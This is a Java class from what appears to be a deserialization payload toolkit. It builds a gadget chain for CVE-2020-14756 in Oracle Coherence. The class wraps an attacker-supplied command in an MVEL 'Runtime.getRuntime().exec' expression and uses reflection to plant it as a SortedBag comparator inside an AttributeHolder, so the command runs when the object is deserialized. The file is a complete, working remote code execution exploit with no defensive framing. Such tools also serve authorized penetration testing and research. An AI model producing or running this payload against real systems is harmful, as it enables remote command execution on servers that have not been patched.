package com.ppp.chain.coherence;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.util.SortedBag;
import com.tangosol.util.aggregator.TopNAggregator;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

// CVE-2020-14756

/*
 * gadget:
 *  AttributeHolder.readExternal()
        ExternalizableHelper.readObject()
            ExternalizableHelper.readObjectInternal()
                ExternalizableHelper.readExternalizableLite()
                    PartialResult.readExternal()
                        PartialResult.add()
                            SortedBag.add()
                                ...
                                    AbstractExtractor.compare()
                                        MvelExtractor.extract()
 */
@Dependencies({"coherence:3.7.1.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0"})
@Authors({Authors.CCKUAILONG})
@Sink({Sink.Default})
public class Coherence4 implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Coherence4.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain((String) sinkObject);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        MvelExtractor extractor = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\""+command+"\")");
        MvelExtractor extractor2 = new MvelExtractor("");

        SortedBag sortedBag = new TopNAggregator.PartialResult(extractor2, 2);
        AttributeHolder attributeHolder = new AttributeHolder();
        sortedBag.add(1);

        Field m_comparator = sortedBag.getClass().getSuperclass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(sortedBag, extractor);

        Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
        setInternalValue.setAccessible(true);
        setInternalValue.invoke(attributeHolder, sortedBag);

        return attributeHolder;
    }
}